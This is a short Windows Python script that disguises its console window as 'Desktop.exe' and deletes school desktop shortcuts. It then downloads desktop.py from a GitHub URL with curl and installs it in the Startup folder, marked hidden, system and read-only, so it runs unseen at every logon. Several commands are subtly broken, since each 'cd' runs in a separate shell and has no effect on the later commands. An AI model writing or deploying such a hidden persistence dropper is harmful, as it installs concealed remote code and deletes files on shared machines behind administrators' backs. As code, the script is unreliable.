import os

os.system("title Desktop.exe")

paths = ["%userprofile%/Desktop/", "%public%/Desktop/"]

for path in paths:
    os.system(f"cd {path}")
    os.system("del Landguiden.url")
    os.system("del www.studi.se.url")   
os.system("cls")

os.system("cd %temp%")
os.system("curl -OL https://raw.githubusercontent.com/thekevie/school-programs/main/desktop.py")
os.system("cd %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
os.system("attrib -h -s -r desktop.py")
os.system("copy /y %temp%\desktop.py desktop.py")
os.system("del /q /f %temp%\desktop.py")
os.system("attrib +h +s +r desktop.py")
